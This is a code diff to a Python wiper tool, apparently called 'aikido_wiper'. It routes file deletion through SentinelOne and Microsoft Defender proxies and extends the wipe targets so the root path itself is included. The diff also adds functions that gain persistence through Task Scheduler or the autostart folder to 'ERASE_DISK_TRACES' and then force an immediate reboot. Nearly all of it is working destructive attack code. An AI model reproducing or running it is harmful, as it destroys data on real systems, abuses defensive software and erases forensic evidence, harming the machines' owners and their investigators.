@@ -1,13 +1,15 @@
+import os
+
 from aikido_wiper.indirect_ops.delete.microsoft_defender_delete_proxy import MicrosoftDefenderDeleteProxy
 from aikido_wiper.indirect_ops.delete.sentinel_one_delete_proxy import SentinelOneDeleteProxy
 from aikido_wiper.indirect_ops.delete.idelete_proxy import IDeleteProxy
 from aikido_wiper.wipe_utils import get_all_dirs_under_dir, get_all_files_under_dir
-from aikido_wiper.windows_utils import get_existing_anti_virus_display_names
+from aikido_wiper.windows_utils import get_existing_anti_virus_display_names, task_scheduler_stay_persistent_with_args, autostart_stay_persistent_with_args
 
 
 WMI_DISPLAY_NAMES_TO_PROXIES_ARG_NAMES_IN_FAVORED_ORDER = {
-    "Sentinel Agent": "SENTINEL_ONE",
-    "Windows Defender": "MICROSOFT_DEFENDER"
+    "Sentinel Agent": SentinelOneDeleteProxy.__name__,
+    "Windows Defender": MicrosoftDefenderDeleteProxy.__name__
 }   
 
 def parse_list_from_file(path: str) -> list[str]:
@@ -49,7 +51,9 @@ def find_dirs_under_dir_from_args(args) -> set[str]:
     if args.exclusion_list_path:
         paths_to_exclude = parse_list_from_file(args.exclusion_list_path)
 
-    return get_all_dirs_under_dir(args.root_path, paths_to_exclude)
+    result = get_all_dirs_under_dir(args.root_path, paths_to_exclude)
+    result.add(args.root_path)
+    return result
 
 
 def find_files_under_dir_from_args(args) -> set[str]:
@@ -63,7 +67,9 @@ def find_files_under_dir_from_args(args) -> set[str]:
     if args.exclusion_list_path:
         paths_to_exclude = parse_list_from_file(args.exclusion_list_path)
 
-    return get_all_files_under_dir(args.root_path, paths_to_exclude)
+    result = get_all_files_under_dir(args.root_path, paths_to_exclude)
+    result.add(args.root_path)
+    return result
 
 
 def find_custom_paths_from_args(args) -> set[str]:
@@ -96,3 +102,19 @@ def get_preferred_proxy_arg_name() -> str:
         return None
 
     return preferred_proxy_arg_name
+
+
+def task_scheduler_reboot_erase_point():
+    """
+    Erases traces from the disk after a reboot using task scheduler for persistency.
+    """
+    task_scheduler_stay_persistent_with_args(cmd_args="-q ERASE_DISK_TRACES")
+    os.system("shutdown -t 0 -r -f")
+
+def autostart_reboot_erase_point():
+    """
+    Erases traces from the disk after a reboot using the current user's autostart
+    directory for persistency.
+    """
+    autostart_stay_persistent_with_args(cmd_args="-q ERASE_DISK_TRACES")
+    os.system("shutdown -t 0 -r -f")
